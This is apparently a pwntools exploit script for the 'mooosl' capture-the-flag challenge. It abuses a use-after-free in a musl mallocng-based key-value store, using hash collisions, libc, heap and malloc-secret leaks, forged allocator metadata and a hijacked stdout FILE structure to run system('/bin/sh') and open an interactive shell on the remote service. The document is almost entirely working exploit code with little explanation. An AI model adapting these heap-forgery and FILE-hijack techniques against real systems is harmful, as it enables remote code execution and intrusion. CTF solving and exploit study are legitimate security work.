from pwn import *
from fixedint import *

context.log_level = 'debug'                                                                                                                                                                                        
#p = process("./mooosl")
p = remote("mooosl.challenges.ooo", 23333)
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

#gdb.attach(p)
"""
set logging on
define foo
printf "calloc"
print $rsi
finish
print $rax
c
end

b calloc
commands
foo
end

define bar
printf "free"
print $rdi
c
end

b free
commands
bar
end
"""


START = (0x7e5)
def brute_force_collision(desired_bucket, cur_num=START):
    options = []
    for x in range(256):
        for y in range(256):
            cur_num = START
            cur_num = ((x + cur_num * 0x13377331))
            cur_num = ((y + cur_num * 0x13377331))
            if (cur_num & 0xfff) == desired_bucket:
                options.append((x, y))
    return options

def store(key, value, keysize=None, valuesize=None):
    if keysize is None:
        keysize = len(key) + 1
    if valuesize is None:
        valuesize = len(value) + 1
    p.sendline("1")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    p.sendline(str(valuesize))
    p.sendline(value[:valuesize-1])
    p.recvuntil(b"ok")

def delete(key, keysize=None, error=False):
    if keysize is None:
        keysize = len(key) + 1
    p.sendline("3")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    if not error:
        p.recvuntil(b"ok")
    else:
        p.recvuntil(b"err")

def query(key, keysize=None):
    if keysize is None:
        keysize = len(key) + 1
    p.sendline("2")
    p.sendline(str(keysize))
    p.sendline(key[:keysize-1])
    return p.recvuntil(b"ok")

default_bucket = START & 0xfff
print("Default bucket %s" % default_bucket)

collisions = brute_force_collision(255)
print(collisions)
i = 0
for x in collisions[:7]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, valuesize=0x50, keysize=0x30)
    i += 1

for x in collisions[7:10]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, keysize=0x30)
    i += 1


for x in collisions[1:7]:
    s = bytes(x)
    p.recvuntil("option:")
    delete(s)

delete(bytes(collisions[0]))
print(collisions)



# This gives write into already freed buffer

store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x8, valuesize=0x8)
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x100, valuesize=0x8) # the second node here gets allocated in the valuesize field

result = query(bytes(collisions[0]))
result = result[result.index(b"0x6:")+4:]
result = result[:result.index(b"\n")]
result = b"" + result[10:12] + result[8:10] + result[6:8] + result[4:6] + result[2:4] + result[0:2]
leak = int(result.decode(), 16)

print("libc leak: %s" % hex(leak))
system_addr = leak - 0x66de0
stdout_addr = leak + (0x7fd6d8ed4280 - 0x7fd6d8ed7870) 
malloc_secret_ptr = system_addr + 0x64030
print("system: %s" % hex(system_addr))
# Heap leak... modify the same chunk but this time value ptr is in a different bin
store(p64(0xcccccccc), b"lolololololololololol", keysize=0x30, valuesize=0x30)
delete(p64(0xbbbbbbbb), keysize=0x30)
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x30, valuesize=0x100) # the second node here gets allocated in the valuesize field
store(p64(0xbbbbbbbb), b"lolololololololololol", keysize=0x30, valuesize=0x100) # the second node here gets allocated in the valuesize field

result = query(bytes(collisions[0]))
result = result[result.index(b"0x6:")+4:]
result = result[:result.index(b"\n")]
result = b"" + result[10:12] + result[8:10] + result[6:8] + result[4:6] + result[2:4] + result[0:2]
heap_leak = int(result.decode(), 16)
print("heap leak: %s" % hex(heap_leak))

# Leak the malloc secret
collisions = [b""] + brute_force_collision(default_bucket)
print(collisions)
i = 0
for x in collisions[:2]:
    s = bytes(x)
    p.recvuntil("option:")
    store(s, 'yoooo%s' % i, valuesize=0x50, keysize=0x30)
    i += 1


delete(bytes(collisions[0]))

store(p64(0xbbbbbbbb), p64(0) + p64(malloc_secret_ptr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x50, valuesize=0x50)
store(p64(0xbbbbbbbb), p64(0) + p64(malloc_secret_ptr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x30, valuesize=0x30)

result = query(bytes(collisions[0]))

result = result[result.index(b"0x50:")+5:]
result = result[:result.index(b"\n")]
secret_data = result[:16] # first 8 bytes are malloc ctx
secret_leak = u64(p64(int(secret_data.decode(), 16), endianness='big')) # endianness flip
print(hex(secret_leak))



# Try to create a mmap-d chunk w/ its own meta... just to see what happens

fake_region_addr = leak + (0x7faf8d835020 - 0x7faf8d90f870)
fake_meta_addr = fake_region_addr + 0x1100
fake_area_addr = fake_meta_addr & ~0xfff
fake_group_addr = fake_meta_addr + 0x30
fake_chunk_addr = fake_group_addr + 0x10
fake_meta2_addr = fake_chunk_addr
fake_group2_addr = fake_chunk_addr + 0x50 # arbitrary
fake_chunk2_addr = fake_group2_addr + 0x10

fake_group1 = p64(fake_meta_addr)
fake_group2 = p64(fake_meta2_addr)

stdin_addr = stdout_addr - 0x100
stdout_ptr = system_addr + 0x63920
#                                                                                      sizeclass=111111      freeable=1    lastidx=offset
#                   prev                next                  group      avail_mask, free_mask    lastidx=1 sizeclass=63, freeable=1, maplen is nonzero
fake_meta1 = p64(fake_chunk_addr) + p64(stdout_ptr) + p64(fake_group_addr) + p64((1 << 1))              + p64((34 << 6) | (1 << 5) | 1 | (0xfff << 12)) # ok the stuff above is a lie, we are faking this into a lower size class
fake_meta2 = p64(0) + p64(0) + p64(fake_group2_addr) + p64(1 << 32)              + p64((34 << 6) | (1 << 5))
fake_area = p64(secret_leak) + b"F" * 0x18

# from https://translate.google.com/translate?hl=en&sl=zh-CN&u=https://www.anquanke.com/post/id/202253&prev=search&pto=aue
stdout_payload = b"/bin/sh\x00" + b'X' * 32 + p64(0xdeadbeef) + b'X' * 8 + p64(0xbeefdead) + b'X' * 8 + p64(system_addr)

chunk_prefix = p64(0)
region_data = b"G" * (fake_area_addr - fake_region_addr) + fake_area.ljust(fake_meta_addr - fake_area_addr) + fake_meta1.ljust(0x30) + fake_group1.ljust(0x8) + chunk_prefix + stdout_payload

store(b"lol", region_data, valuesize=0x22000)
print(hex(fake_region_addr))
print(hex(fake_chunk_addr))

delete(p64( 0xbbbbbbbb), keysize=0x30)
delete(p64( 0xbbbbbbbb), keysize=0x30)
store(p64(0xbbbbbbbb), p64(0) + p64(fake_chunk_addr) + p64(0) + p64(0x50) + p64(2021) + p64(0), keysize=0x30, valuesize=0x30)
delete(bytes(collisions[0]))
p.sendline(str(4))
p.interactive()

p.interactive()
store(p64(0xbbbbbbbb), b"hi" * 0x1000, keysize=0x30, valuesize=0x1000)
p.interactive()



# AGAIN: for /bin/sh
